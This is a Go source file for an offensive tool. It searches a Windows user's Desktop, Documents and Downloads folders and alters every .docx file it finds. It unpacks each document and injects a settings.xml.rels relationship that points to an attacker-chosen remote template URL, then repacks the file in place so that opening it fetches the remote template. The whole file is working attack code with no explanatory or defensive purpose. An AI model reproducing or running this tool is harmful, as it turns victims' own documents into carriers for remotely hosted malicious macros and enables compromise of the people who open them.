package main

import (
	"fmt"
	"os"
	"path/filepath"
	"os/exec"
	"flag"
	"strings"
	"bytes"
	"io/ioutil"
)


//directories - the directories to search (EX: Desktop, Documents, Downloads)
func findDocumentPaths(directories []string, templateUrl string) {
	for _, directory := range directories {
		path := os.Getenv("USERPROFILE") + "\\" + directory
		err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				fmt.Println(err)
			}
			// search only for .docx files
			if filepath.Ext(path) == ".docx" {
				fmt.Println("[+] Targeting:", path)
				downloadAndInject(path, templateUrl)
			}
			return nil
		})
		if err != nil {
			fmt.Println(err)
		}
	}
	return

}
func downloadAndInject(documentPath string, templateUrl string) {
	// we create a temporary directory & change into it
	dstDir := os.Getenv("USERPROFILE") + "\\Temp"
	fmt.Println("[+] Creating temporary directory at:", dstDir)
	_ = os.Mkdir(dstDir, 0755)
	os.Chdir(dstDir)
	cwd, _ := os.Getwd()
	fmt.Println("[+] Current working directory is:", cwd)
	// then we move the target directory to our temp directory & rename the document in order to unzip it
	fmt.Println("[+] Moving target document to temp directory...")
	newDocumentName := dstDir + "\\target.zip"
	err := os.Rename(documentPath, newDocumentName)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[+] Unzipping document: ", documentPath)
	_, err = exec.Command("powershell.exe", "Expand-Archive", "-LiteralPath", "target.zip", "-DestinationPath", ".").Output()
	os.Remove("target.zip")
	if err != nil {
		fmt.Println(err)
	}

	// modifying/adding settings.xml in word\ to force the document to become a template if it already isn't one
	settingsXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15 w16se w16cid"><w:zoom w:percent="100"/><w:removePersonalInformation/><w:removeDateAndTime/><w:activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="6" w:nlCheck="1" w:checkStyle="1"/><w:activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="0" w:nlCheck="1" w:checkStyle="0"/><w:attachedTemplate r:id="rId1"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:hdrShapeDefaults><o:shapedefaults v:ext="edit" spidmax="2049"/></w:hdrShapeDefaults><w:footnotePr><w:footnote w:id="-1"/><w:footnote w:id="0"/></w:footnotePr><w:endnotePr><w:endnote w:id="-1"/><w:endnote w:id="0"/></w:endnotePr><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="useWord2013TrackBottomHyphenation" w:uri="http://schemas.microsoft.com/office/word" w:val="0"/></w:compat><w:rsids><w:rsidRoot w:val="00FA0D47"/><w:rsid w:val="00007202"/><w:rsid w:val="000150E9"/><w:rsid w:val="00030E3C"/><w:rsid w:val="00072D27"/><w:rsid w:val="00083C22"/><w:rsid w:val="00086E87"/><w:rsid w:val="000871A8"/><w:rsid w:val="000A036B"/><w:rsid w:val="000D0E4A"/><w:rsid w:val="000F11B9"/><w:rsid w:val="00102341"/><w:rsid w:val="00105960"/><w:rsid w:val="001073CE"/><w:rsid w:val="00121553"/><w:rsid w:val="00131CAB"/><w:rsid w:val="001D0BD1"/><w:rsid w:val="002017AC"/><w:rsid w:val="002359ED"/><w:rsid w:val="00252520"/><w:rsid w:val="002625F9"/><w:rsid w:val="002631F7"/><w:rsid w:val="0026484A"/><w:rsid w:val="0026504D"/><w:rsid w:val="00276926"/><w:rsid w:val="002A67C8"/><w:rsid w:val="002B40B7"/><w:rsid w:val="002C5D75"/><w:rsid w:val="00301789"/><w:rsid w:val="00325194"/><w:rsid w:val="003728E3"/><w:rsid w:val="003962D3"/><w:rsid w:val="003C7D9D"/><w:rsid w:val="003E3A63"/><w:rsid w:val="00457BEB"/><w:rsid w:val="00461B2E"/><w:rsid w:val="00482CFC"/><w:rsid w:val="00487996"/><w:rsid w:val="00491910"/><w:rsid w:val="004A3D03"/><w:rsid w:val="004B6D7F"/><w:rsid w:val="004D785F"/><w:rsid w:val="004E744B"/><w:rsid w:val="004F7760"/><w:rsid w:val="00520AC9"/><w:rsid w:val="00594254"/><w:rsid w:val="005B6EB8"/><w:rsid w:val="00614CAB"/><w:rsid w:val="00633BC0"/><w:rsid w:val="00661DE5"/><w:rsid w:val="006706DE"/><w:rsid w:val="0069487E"/><w:rsid w:val="006A648B"/><w:rsid w:val="006B0B82"/><w:rsid w:val="006B7EF2"/><w:rsid w:val="006C3B5F"/><w:rsid w:val="006D3A72"/><w:rsid w:val="006F53EE"/><w:rsid w:val="00717507"/><w:rsid w:val="007263B8"/><w:rsid w:val="00726D9C"/><w:rsid w:val="00726F2C"/><w:rsid w:val="00736D30"/><w:rsid w:val="00742FF3"/><w:rsid w:val="00794B27"/><w:rsid w:val="007A73CB"/><w:rsid w:val="007A7846"/><w:rsid w:val="007B2795"/><w:rsid w:val="007F66F5"/><w:rsid w:val="00812400"/><w:rsid w:val="0082203C"/><w:rsid w:val="008360A8"/><w:rsid w:val="008416E0"/><w:rsid w:val="00853E64"/><w:rsid w:val="00895251"/><w:rsid w:val="00897BFF"/><w:rsid w:val="008C61B9"/><w:rsid w:val="00912477"/><w:rsid w:val="009139AF"/><w:rsid w:val="00943B06"/><w:rsid w:val="00945864"/><w:rsid w:val="009806F4"/><w:rsid w:val="009853E9"/><w:rsid w:val="00996E16"/><w:rsid w:val="009B69C5"/><w:rsid w:val="009D3947"/><w:rsid w:val="009F72A7"/><w:rsid w:val="00A119D9"/><w:rsid w:val="00A1309F"/><w:rsid w:val="00A21BED"/><w:rsid w:val="00A27D99"/><w:rsid w:val="00A60D92"/><w:rsid w:val="00A86EAC"/><w:rsid w:val="00A923E7"/><w:rsid w:val="00AA661C"/><w:rsid w:val="00AC2F58"/><w:rsid w:val="00B369B4"/><w:rsid w:val="00B53817"/><w:rsid w:val="00B61F85"/><w:rsid w:val="00BA3CC7"/><w:rsid w:val="00BF457D"/><w:rsid w:val="00BF4775"/><w:rsid w:val="00CA0C45"/><w:rsid w:val="00CC3AB0"/><w:rsid w:val="00CD4A9C"/><w:rsid w:val="00CF12AE"/><w:rsid w:val="00D1798D"/><w:rsid w:val="00D902A4"/><w:rsid w:val="00DB2323"/><w:rsid w:val="00DB331E"/><w:rsid w:val="00DC4E21"/><w:rsid w:val="00DD5358"/><w:rsid w:val="00E224A0"/><w:rsid w:val="00E254F0"/><w:rsid w:val="00E4313F"/><w:rsid w:val="00E51168"/><w:rsid w:val="00E55B4B"/><w:rsid w:val="00E55FC7"/><w:rsid w:val="00E72A21"/><w:rsid w:val="00E7715A"/><w:rsid w:val="00EB48ED"/><w:rsid w:val="00EB700D"/><w:rsid w:val="00F33B83"/><w:rsid w:val="00F41B42"/><w:rsid w:val="00F54BD0"/><w:rsid w:val="00FA0D47"/><w:rsid w:val="00FB3BB2"/><w:rsid w:val="00FF44F1"/><w:rsid w:val="00FF5FDF"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:doNotAutoCompressPictures/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="2049"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w14:docId w14:val="77EBD96F"/><w15:chartTrackingRefBased/></w:settings>`
	documentXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/></Relationships>`
	appXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>testtemplate.dotm</Template><TotalTime>0</TotalTime><Pages>0</Pages><Words>0</Words><Characters>0</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>0</Lines><Paragraphs>0</Paragraphs><ScaleCrop>false</ScaleCrop><Company></Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>0</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>`
	contentTypeXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/><Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/><Override PartName="/word/footnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"/><Override PartName="/word/endnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.endnotes+xml"/><Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/><Override PartName="/word/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>`
	footnotesXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:footnotes xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid wp14"><w:footnote w:type="separator" w:id="-1"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:separator/></w:r></w:p></w:footnote><w:footnote w:type="continuationSeparator" w:id="0"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:continuationSeparator/></w:r></w:p></w:footnote></w:footnotes>`
	endnotesXmlInject := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:endnotes xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid wp14"><w:endnote w:type="separator" w:id="-1"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:separator/></w:r></w:p></w:endnote><w:endnote w:type="continuationSeparator" w:id="0"><w:p w:rsidR="0010405F" w:rsidRDefault="0010405F"><w:pPr><w:spacing w:after="0" w:line="240" w:lineRule="auto"/></w:pPr><w:r><w:continuationSeparator/></w:r></w:p></w:endnote></w:endnotes>`

	// modifying [Content_Type].xml in base directory where document is unzipped (%USERPROFILE%\Temp)
	// first we replace Linux's LF to Windows' CR LF
	winContentTypeXmlInject := bytes.Replace([]byte(contentTypeXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("[Content_Types].xml", winContentTypeXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully modified [Content_Types].xml!")
	}

	// modifying/adding settings.xml to word/
	err = os.Chdir("word")
	if err != nil {
		fmt.Println(err)
	} else {	
		fmt.Println("[+] Successfully changed into word directory! Modifying/adding settings.xml!")
	}
	// we replace Linux's LF to Windows' CR LF
	winSettingsXmlInject := bytes.Replace([]byte(settingsXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("settings.xml", winSettingsXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully modified settings.xml!")
	}

	// modifying/adding footnotes.xml to word/
	// first we replace Linux's LF to Windows' CR LF
	winFootnotesXmlInject := bytes.Replace([]byte(footnotesXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("footnotes.xml", winFootnotesXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully added/modified footnotes.xml!")
	}
	// modifying/adding endnotes.xml to word/
	// first we replace Linux's LF to Windows' CR LF
	winEndnotesXmlInject := bytes.Replace([]byte(endnotesXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("endnotes.xml", winEndnotesXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully added/modified endnotes.xml!")
	}

	// modifying/adding settings.xml.rels into word/_rels
	err = os.Chdir("_rels")
	if err != nil {
		fmt.Println(err)
	}
	cwd, _ = os.Getwd()
	fmt.Println("[+] Changed directory into:", cwd)
	injectEntry := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="` + templateUrl + `" TargetMode="External"/></Relationships>`
	// we replace Linux's LF to Windows' CR LF
	winInjectEntry := bytes.Replace([]byte(injectEntry), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("settings.xml.rels", winInjectEntry, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully injected template!")
	}

	// modifying/adding document.xml.rels in word/_rels
	// we replace Linux's LF to Windows' CR LF
	winDocumentXmlInject := bytes.Replace([]byte(documentXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("document.xml.rels", winDocumentXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully added/modified document.xml.rels!")
	}

	// modifying/adding app.xml in docProps/
	err = os.Chdir("..\\..\\docProps")
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully changed to docProps directory!")
	}
	// we replace Linux's LF to Windows' CR LF
	winAppXmlInject := bytes.Replace([]byte(appXmlInject), []byte{10}, []byte{13, 10}, -1)
	err = ioutil.WriteFile("app.xml", winAppXmlInject, 0777)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully added/modified app.xml!")
	}
	
	// rezipping
	fmt.Println("[+] Beginning rezipping process...")
	os.Chdir("..\\")
	cwd, _ = os.Getwd()
	fmt.Println("[+] Changed directory into:", cwd)
	_, err = exec.Command("powershell.exe", "Compress-Archive", "*", "-DestinationPath", "injected.zip").Output()
	err = os.Rename("injected.zip", documentPath)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully injected, moved, & renamed document back to:", documentPath)
	}
	// back out of temp directory completely
	os.Chdir("..\\")
	err = os.RemoveAll(dstDir)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("[+] Successfully removed directory:", dstDir)
	}
	return

}


func main() {
	var templateURL string
	flag.StringVar(&templateURL, "url", "", "URL to a template file to inject")
	flag.Parse()
	//if provided template URL is nonexistent or doesn't start with https or http, return
	if len(templateURL) == 0 || strings.HasPrefix(templateURL, "http") != true {
		fmt.Println("[!] Please provide a valid template url! See template flag!")
		return
	}
	paths := []string{"Desktop", "Documents", "Downloads"}
	findDocumentPaths(paths, templateURL)
	return
}
